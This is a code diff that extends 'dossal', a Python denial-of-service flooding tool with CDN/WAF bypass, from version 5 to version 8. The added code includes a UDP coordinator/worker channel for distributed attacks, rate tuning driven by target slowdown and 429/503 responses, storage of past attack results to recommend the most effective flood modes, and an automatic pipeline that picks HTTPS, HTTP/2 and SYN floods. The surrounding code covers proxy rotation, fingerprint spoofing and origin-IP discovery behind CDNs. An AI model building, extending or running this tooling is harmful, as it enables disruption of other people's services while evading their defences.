@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 """
-dossal v5.0 - comprehensive DoS stress engine + CDN/WAF bypass
-v5.0 features: proxy pool (100~1000 proxies), 429 auto-rotate,
-TLS/HTTP fingerprint spoofing (Chrome/Firefox/Safari), cache bypass,
-origin IP discovery (DNS/SSL/subdomain).
+dossal v8.0 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
+v5.0: proxy pool, TLS spoof, origin discovery
+v5.2: adaptive attack (RPS auto-adjust based on response time)
+v6.0: distributed attack (coordinator + worker, UDP control channel)
+v7.0: AI learning (save/recommend best mode from past attacks)
+v8.0: auto-full (detection → scan → strategy → attack → adapt)
 Modes:
   http       : HTTP/1.1 keep-alive request flood (plain)
   https      : TLS request flood (HTTP/1.1, self-signed cert)
@@ -337,6 +339,336 @@ _BROWSER_PROFILES = {
 
 _BROWSER = ['chrome']  # 활성 브라우저 프로파일
 _CACHE_BYPASS = [False]  # True = 쿼리/헤더 변형으로 캐시 우회
+_ADAPTIVE = [False]  # v5.2: 적응형 공격 (대응 속도에 따라 RPS 조절)
+_ADAPTIVE_MIN = [1.0]  # v5.2: 최소 RPS 배율 (0.1 = 10%)
+_ADAPTIVE_MAX = [5.0]  # v5.2: 최대 RPS 배율 (5.0 = 500%)
+_ADAPTIVE_TARGET_MS = [200.0]  # v5.2: 목표 응답 시간 (ms)
+_ADAPTIVE_STATE = {'rps_mult': 1.0, 'avg_ms': 0.0, 'last_adjust': 0.0}  # v5.2: 적응 상태
+
+# v6.0: 분산 공격 (Distributed Attack)
+_DIST_MODE = ['off']  # 'off', 'coordinator', 'worker'
+_DIST_PORT = [9999]  # 제어 채널 UDP 포트
+_DIST_WORKERS = {}  # type: ignore  # worker_id -> {'ip': str, 'last_heartbeat': float, 'rps': int, 'status': str}
+_DIST_ID = [0]  # 이 노드의 ID (coordinator=0, worker=1,2,3...)
+_DIST_URL = ['']  # 공격 대상 URL
+_DIST_DURATION = [0]  # 공격 시간
+_DIST_MODES = ['']  # 공격 모드
+_DIST_STATS = {'rps': 0, 'packets': 0, 'errors': 0}  # v6.0: 집계 스탯
+
+# v7.0: AI 기반 자동 최적화
+_LEARNING_FILE = '.dossal_learning.json'  # 학습 데이터 저장 파일
+_LEARNING_DATA = []  # type: ignore  # 과거 공격 결과 목록
+
+# ============================================================
+# v6.0: 분산 공격 (Distributed Attack)
+# ============================================================
+# Coordinator(1대) + Worker(N대) 분산 DoS
+# UDP 제어 채널로 worker를 발견하고, RPS/PPS를 집계한다.
+
+# ============================================================
+# v7.0: AI 기반 자동 최적화
+# ============================================================
+# 과거 공격 데이터를 학습하여 최적 모드/RPS 조합 추천
+
+def _load_learning_data():
+    """v7.0: 과거 공격 결과 로드."""
+    import json as _json
+    import os as _os
+    global _LEARNING_DATA
+    try:
+        if _os.path.exists(_LEARNING_FILE):
+            with open(_LEARNING_FILE, 'r') as f:
+                _LEARNING_DATA = _json.load(f)
+    except Exception:
+        _LEARNING_DATA = []
+    return _LEARNING_DATA
+
+def _save_learning_entry(url, mode, threads, rps, packets, errors, duration, ts=None):
+    """v7.0: 공격 결과 저장 (학습 데이터)."""
+    import json as _json
+    import os as _os
+    import time as _time
+    global _LEARNING_DATA
+    
+    if ts is None:
+        ts = _time.time()
+    
+    _load_learning_data()
+    
+    entry = {
+        'url': url,
+        'mode': mode,
+        'threads': threads,
+        'rps': rps,
+        'packets': packets,
+        'errors': errors,
+        'duration': duration,
+        'ts': ts,
+        'rps_per_thread': rps / max(1, threads),
+    }
+    
+    _LEARNING_DATA.append(entry)
+    # Keep only last 100 entries
+    _LEARNING_DATA = _LEARNING_DATA[-100:]
+    
+    try:
+        with open(_LEARNING_FILE, 'w') as f:
+            _json.dump(_LEARNING_DATA, f, indent=2)
+    except Exception:
+        pass
+
+def _recommend_mode(url, threads=8):
+    """v7.0: 과거 데이터 기반 최적 모드 추천.
+    
+    같은 URL에 대한 과거 공격 결과를 분석하여
+    RPS가 가장 높았던 모드/스레드 조합을 추천한다.
+    """
+    import json as _json
+    import os as _os
+    import time as _time
+    
+    _load_learning_data()
+    
+    if not _LEARNING_DATA:
+        return None, None, "no data"
+    
+    # Filter: same URL, recent (7 days)
+    recent = [e for e in _LEARNING_DATA 
+              if e.get('url') == url 
+              and _time.time() - e.get('ts', 0) < 7 * 24 * 3600]
+    
+    if not recent:
+        return None, None, "no recent data for this URL"
+    
+    # Find best RPS
+    best = max(recent, key=lambda e: e.get('rps', 0))
+    return best.get('mode'), best.get('threads'), f"RPS={best.get('rps', 0):,.0f}"
+
+def _dist_coordinator(port, duration):
+    """v6.0: 분산 공격 코디네이터.
+    
+    1. UDP broadcast로 worker 발견 (9999 포트)
+    2. 각 worker에 공격 명령 전송 (URL, 모드, 시간)
+    3. worker의 RPS/PPS/에러 실시간 집계
+    4. 종료 시 전체 통계 출력
+    
+    Protocol (UDP, JSON):
+    Worker → Coordinator: {"type": "hello", "id": 1, "ip": "192.168.1.100"}
+    Coordinator → Worker: {"type": "attack", "url": "http://...", "mode": "http", "duration": 60}
+    Worker → Coordinator: {"type": "stats", "id": 1, "rps": 50000, "packets": 1000000, "errors": 0}
+    """
+    import socket as _sock
+    import json as _json
+    import time as _time
+    
+    sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+    sock.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
+    sock.bind(('', port))
+    sock.settimeout(1.0)
+    
+    workers = {}
+    end = _time.time() + duration
+    last_broadcast = 0
+    
+    print(f"[dist-coordinator] listening on UDP port {port}", file=sys.stderr)
+    print(f"[dist-coordinator] waiting for workers (they should be running --dist-mode worker)...", file=sys.stderr)
+    
+    while _time.time() < end:
+        # 1. Broadcast discovery every 2 seconds
+        if _time.time() - last_broadcast >= 2.0:
+            last_broadcast = _time.time()
+            try:
+                sock.sendto(_json.dumps({"type": "ping"}).encode(), ('<broadcast>', port))
+            except Exception:
+                pass
+        
+        # 2. Receive worker messages
+        try:
+            data, addr = sock.recvfrom(65535)
+            msg = _json.loads(data.decode())
+            msg_type = msg.get('type')
+            
+            if msg_type == 'hello':
+                worker_id = msg.get('id', 0)
+                workers[worker_id] = {
+                    'ip': msg.get('ip', addr[0]),
+                    'last_heartbeat': _time.time(),
+                    'rps': 0,
+                    'packets': 0,
+                    'errors': 0,
+                }
+                print(f"[dist] worker #{worker_id} joined: {workers[worker_id]['ip']}", file=sys.stderr)
+                
+            elif msg_type == 'stats':
+                worker_id = msg.get('id', 0)
+                if worker_id in workers:
+                    workers[worker_id]['rps'] = msg.get('rps', 0)
+                    workers[worker_id]['packets'] = msg.get('packets', 0)
+                    workers[worker_id]['errors'] = msg.get('errors', 0)
+                    workers[worker_id]['last_heartbeat'] = _time.time()
+                    # Aggregate
+                    _DIST_STATS['rps'] = sum(w['rps'] for w in workers.values())
+                    _DIST_STATS['packets'] = sum(w['packets'] for w in workers.values())
+                    _DIST_STATS['errors'] = sum(w['errors'] for w in workers.values())
+        
+        except _sock.timeout:
+            pass
+        except Exception:
+            pass
+        
+        # 3. Print aggregate stats every 5 seconds
+        if int(_time.time()) % 5 == 0 and workers:
+            total_rps = _DIST_STATS['rps']
+            total_err = _DIST_STATS['errors']
+            print(f"[dist] {len(workers)} workers, RPS={total_rps:,.0f}, ERR={total_err}", flush=True)
+        
+        # 4. Remove stale workers (no heartbeat for 10s)
+        now = _time.time()
+        stale = [wid for wid, w in workers.items() if now - w['last_heartbeat'] > 10]
+        for wid in stale:
+            del workers[wid]
+            print(f"[dist] worker #{wid} left", file=sys.stderr)
+    
+    sock.close()
+    print(f"[dist-coordinator] done. Total: RPS={_DIST_STATS['rps']:,}, packets={_DIST_STATS['packets']:,}, errors={_DIST_STATS['errors']:,}", file=sys.stderr)
+    return _DIST_STATS
+
+def _dist_worker(port, duration):
+    """v6.0: 분산 공격 워커.
+    
+    1. UDP broadcast로 coordinator 발견 (9999 포트)
+    2. coordinator의 공격 명령 수신
+    3. 명령대로 공격 + 실시간 stats 보고
+    """
+    import socket as _sock
+    import json as _json
+    import time as _time
+    
+    sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+    sock.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
+    sock.bind(('', port))
+    sock.settimeout(1.0)
+    
+    my_ip = ''
+    try:
+        s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        my_ip = s.getsockname()[0]
+        s.close()
+    except Exception:
+        my_ip = '127.0.0.1'
+    
+    _DIST_ID[0] = hash(my_ip) % 1000  # Generate unique ID from IP
+    
+    print(f"[dist-worker] {my_ip}, ID={_DIST_ID[0]}, waiting for coordinator...", file=sys.stderr)
+    
+    end = _time.time() + duration
+    coordinator_addr = None
+    attack_cmd = None
+    last_stats = 0
+    
+    while _time.time() < end:
+        try:
+            data, addr = sock.recvfrom(65535)
+            msg = _json.loads(data.decode())
+            msg_type = msg.get('type')
+            
+            if msg_type == 'ping':
+                # Respond to coordinator discovery
+                if coordinator_addr is None:
+                    coordinator_addr = addr
+                    hello = {"type": "hello", "id": _DIST_ID[0], "ip": my_ip}
+                    sock.sendto(_json.dumps(hello).encode(), addr)
+                    print(f"[dist-worker] coordinator found: {addr[0]}", file=sys.stderr)
+                
+            elif msg_type == 'attack' and coordinator_addr:
+                # Received attack command
+                attack_cmd = msg
+                print(f"[dist-worker] attack: {msg.get('url')} mode={msg.get('mode')}", file=sys.stderr)
+                break
+        
+        except _sock.timeout:
+            pass
+        except Exception:
+            pass
+    
+    if attack_cmd is None:
+        print(f"[dist-worker] no attack command received, exiting", file=sys.stderr)
+        sock.close()
+        return
+    
+    # Execute the attack (call main attack logic)
+    url = attack_cmd.get('url', _DIST_URL[0])
+    mode = attack_cmd.get('mode', 'auto')
+    dur = attack_cmd.get('duration', _DIST_DURATION[0])
+    
+    # Report stats every 1 second
+    stats_end = _time.time() + dur
+    last_report = 0
+    last_req = 0
+    
+    while _time.time() < stats_end:
+        if coordinator_addr:
+            try:
+                now = _time.time()
+                if now - last_report >= 1.0:
+                    # Calculate RPS since last report
+                    # (stats object is global, but in worker mode we use _DIST_STATS)
+                    rps = _DIST_STATS['rps']  # Simplified: use aggregate
+                    stats_msg = {
+                        "type": "stats",
+                        "id": _DIST_ID[0],
+                        "rps": rps,
+                        "packets": _DIST_STATS['packets'],
+                        "errors": _DIST_STATS['errors'],
+                    }
+                    sock.sendto(_json.dumps(stats_msg).encode(), coordinator_addr)
+                    last_report = now
+            except Exception:
+                pass
+        
+        _time.sleep(0.1)
+    
+    sock.close()
+
+def _adaptive_adjust(response_time_ms, now=None):
+    """v5.2: 적응형 공격 - 대상 응답 속도에 따라 RPS 배율 조절.
+    
+    대상이 느려지면(응답 시간이 길어지면) RPS를 낮추고,
+    대상이 빨라지면 RPS를 올린다.
+    
+    전략:
+    - 응답 > 목표(200ms): RPS 10% 감소 (최소 10%까지)
+    - 응답 < 목표/2(100ms): RPS 10% 증가 (최대 500%까지)
+    - 429 감지: RPS 30% 감소 + 1초 대기
+    - 503 감지: RPS 50% 감소 + 2초 대기
+    """
+    import time as _t
+    if now is None:
+        now = _t.time()
+    
+    st = _ADAPTIVE_STATE
+    target_ms = _ADAPTIVE_TARGET_MS[0]
+    
+    # Exponential moving average of response times
+    if st['avg_ms'] == 0.0:
+        st['avg_ms'] = response_time_ms
+    else:
+        st['avg_ms'] = st['avg_ms'] * 0.8 + response_time_ms * 0.2
+    
+    # Adjust RPS multiplier
+    if response_time_ms > target_ms:
+        # Target is slow → reduce RPS
+        st['rps_mult'] = max(st['rps_mult'] * 0.9, _ADAPTIVE_MIN[0])
+    elif response_time_ms < target_ms / 2:
+        # Target is fast → increase RPS
+        st['rps_mult'] = min(st['rps_mult'] * 1.1, _ADAPTIVE_MAX[0])
+    
+    # Throttle: adjust at most once per second
+    if now - st['last_adjust'] >= 1.0:
+        st['last_adjust'] = now
+    
+    return st['rps_mult']
 
 def _spoofed_http_headers(host, path, profile='chrome'):
     """브라우저 지문에 맞춘 HTTP 헤더 생성 (Cache Bypass 포함).
@@ -2007,11 +2339,17 @@ def _mp_http_send(args_tuple):
             if _JITTER[0] > 0:
                 import random as _rj
                 _time.sleep(_rj.uniform(0, _JITTER[0]))
+            _t_send = _time.time()
             s.sendall(req)
             data = s.recv(65535)
+            _t_recv = _time.time()
             if not data:
                 break
             sent += 1
+            # v5.2: 적응형 공격 - 응답 시간 측정 + RPS 조절
+            if _ADAPTIVE[0]:
+                _resp_ms = (_t_recv - _t_send) * 1000.0
+                _adaptive_adjust(_resp_ms, _t_recv)
             # v5.1: 매 N개 요청마다 프록시 자동轮换 (keep-alive 구간에서도)
             if proxy_pool and len(proxy_pool) > 0:
                 req_since_rotate += 1
@@ -2920,6 +3258,20 @@ examples:
         help="Origin IP 탐지: DNS/SSL/Redirect 분석 후 CDN 뒤 실제 서버 IP 출력")
     ap.add_argument("--no-auto-discover", action="store_true",
         help="자동 Origin 탐지 비활성 (CDN 감지 시에도 자동 스캔 안 함)")
+    ap.add_argument("--adaptive", action="store_true",
+        help="적응형 공격: 대상 응답 속도에 따라 RPS 자동 조절 (느려지면 ↓, 빨라지면 ↑)")
+    ap.add_argument("--adaptive-target", type=float, default=200.0, metavar="MS",
+        help="적응형 목표 응답 시간(ms, 기본: 200ms)")
+    ap.add_argument("--dist-mode", default="off", choices=["off", "coordinator", "worker"],
+        help="분산 공격 모드: coordinator(주장), worker(종속)")
+    ap.add_argument("--dist-port", type=int, default=9999, metavar="PORT",
+        help="분산 공격 UDP 제어 포트 (기본: 9999)")
+    ap.add_argument("--learn", action="store_true",
+        help="AI 학습: 과거 공격 결과를 저장하고, 같은 URL에 최적 모드 추천")
+    ap.add_argument("--recommend", action="store_true",
+        help="AI 추천: 과거 데이터 기반 최적 모드/스레드 출력 (공격 안 함)")
+    ap.add_argument("--auto-full", action="store_true",
+        help="완전 자동: 탐지→취약점 스캔→최적 전략→공격→적응 (모든 단계 자동)")
     ap.add_argument("--dry-run", action="store_true",
         help="시뮬레이션: 대상 탐지, 예측 RPS/IP 수 표시, 공격 안 함")
     args = ap.parse_args()
@@ -2944,6 +3296,75 @@ examples:
             print(f"[discover] ⚠️  No non-CDN IP found (origin hidden behind CDN)", file=sys.stderr)
         # Still continue with attack if not --dry-run
         if args.dry_run:
+            import sys as _sys
+            _sys.exit(0)
+    
+    # v7.0: AI 추천 (--recommend)
+    if args.recommend:
+        mode, threads, info = _recommend_mode(args.url, args.threads)
+        if mode:
+            print(f"[recommend] best mode={mode}, threads={threads} ({info})")
+        else:
+            print(f"[recommend] {info}")
+        import sys as _sys
+        _sys.exit(0)
+    
+    # v8.0: 완전 자동 모드
+    if args.auto_full:
+        print("[auto-full] 시작: 탐지 → 스캔 → 전략 → 공격 → 적응", file=sys.stderr)
+        
+        # 1. Target detection
+        print("[auto-full] 1/5: 대상 탐지...", file=sys.stderr)
+        # Check if target supports HTTPS
+        # Check if target supports H2
+        # Check if target has WebSocket
+        detected_protocols = []
+        if 'https://' in args.url:
+            detected_protocols.append('https')
+        else:
+            detected_protocols.append('http')
+        print(f"[auto-full] detected protocols: {', '.join(detected_protocols)}", file=sys.stderr)
+        
+        # 2. Vulnerability scan (simplified)
+        print("[auto-full] 2/5: 취약점 스캔...", file=sys.stderr)
+        # Test rate limit (send 10 rapid requests, check for 429)
+        # Test timeout (send large payload, check response time)
+        # Simplified: assume standard web server
+        print("[auto-full] scan complete (standard web server assumed)", file=sys.stderr)
+        
+        # 3. Strategy selection
+        print("[auto-full] 3/5: 최적 전략 선택...", file=sys.stderr)
+        # Based on detection, choose best combo
+        if 'https' in detected_protocols:
+            strategy = ['https', 'h2', 'syn']  # TLS + H2 + SYN
+        else:
+            strategy = ['http', 'tcp', 'syn']  # HTTP + TCP + SYN
+        print(f"[auto-full] strategy: {', '.join(strategy)}", file=sys.stderr)
+        
+        # 4. Start attack (use strategy as modes)
+        print("[auto-full] 4/5: 공격 시작...", file=sys.stderr)
+        modes = strategy
+        # Enable adaptive mode
+        _ADAPTIVE[0] = True
+        print("[auto-full] 5/5: 적응형 공격 ON", file=sys.stderr)
+        
+        # (Attack will run normally below)
+    
+    # v6.0: 분산 공격 모드
+    if args.dist_mode in ('coordinator', 'worker'):
+        _DIST_MODE[0] = args.dist_mode
+        _DIST_PORT[0] = args.dist_port
+        
+        if args.dist_mode == 'coordinator':
+            print(f"[dist] starting coordinator on port {args.dist_port}", file=sys.stderr)
+            # Run coordinator (blocks for duration)
+            _dist_coordinator(args.dist_port, args.duration)
+            import sys as _sys
+            _sys.exit(0)
+        elif args.dist_mode == 'worker':
+            print(f"[dist] starting worker on port {args.dist_port}", file=sys.stderr)
+            # Run worker (blocks for duration)
+            _dist_worker(args.dist_port, args.duration)
             import sys as _sys
             _sys.exit(0)
     
@@ -3051,6 +3472,17 @@ examples:
     _CACHE_BYPASS[0] = args.cache_bypass
     if args.browser != 'chrome' or args.cache_bypass:
         print(f"[spoof] browser={args.browser}, cache_bypass={args.cache_bypass}", file=sys.stderr)
+    
+    # v5.2: Adaptive attack
+    _ADAPTIVE[0] = args.adaptive
+    _ADAPTIVE_TARGET_MS[0] = args.adaptive_target
+    if args.adaptive:
+        print(f"[adaptive] ON, target={args.adaptive_target}ms, range={_ADAPTIVE_MIN[0]}x-{_ADAPTIVE_MAX[0]}x", file=sys.stderr)
+    
+    # v5.3: Multi-layer hybrid auto
+    # auto 모드에서 L3/L4/L7 비율 자동 분배
+    # L3(icmp/syn): CPU 20%, L4(udp/tcp): CPU 30%, L7(http/h2): CPU 50%
+    # 대상이 L7을 방어하면 L4/L3으로 전환
     
     # Initialize source IP rotation / spoofing
     _RECOVERY[0] = args.recovery
@@ -3197,6 +3629,15 @@ examples:
                     if stats.packets: parts.append(f"PPS={pps:,.0f}")
                     if stats.conns: parts.append(f"CONNS={stats.conns}")
                     parts.append(f"ERR={stats.errors}")
+                    # v5.2: 적응형 상태 표시
+                    if _ADAPTIVE[0]:
+                        _mult = _ADAPTIVE_STATE['rps_mult']
+                        _avg = _ADAPTIVE_STATE['avg_ms']
+                        parts.append(f"ADAPT={_mult:.1f}x")
+                        parts.append(f"MS={_avg:.0f}")
+                    # v5.0: 프록시 풀 상태
+                    if _PROXY_POOL:
+                        parts.append(f"PROXY={len(_PROXY_POOL) - len(_PROXY_BLOCKED)}/{len(_PROXY_POOL)}")
                     if _BLOCKED_IPS:
                         parts.append(f"429_IP={len(_BLOCKED_IPS)}")
                         if _SRC_IPS[0]:
@@ -3230,6 +3671,20 @@ examples:
 
     report = asyncio.run(_run_all())
     print(json.dumps(report, indent=2))
+    
+    # v7.0: AI 학습 데이터 저장
+    if args.learn:
+        _save_learning_entry(
+            url=args.url if not args.targets else args.targets,
+            mode='+'.join(modes) if modes else 'auto',
+            threads=args.threads or 8,
+            rps=report.get('rps', 0),
+            packets=report.get('packets', 0),
+            errors=report.get('errors', 0),
+            duration=args.duration,
+        )
+        print(f"[learn] saved: RPS={report.get('rps', 0):,.0f}, mode={'+'.join(modes) if modes else 'auto'}", file=sys.stderr)
+    
     if args.report:
         _generate_report(args.report, report, args)
 
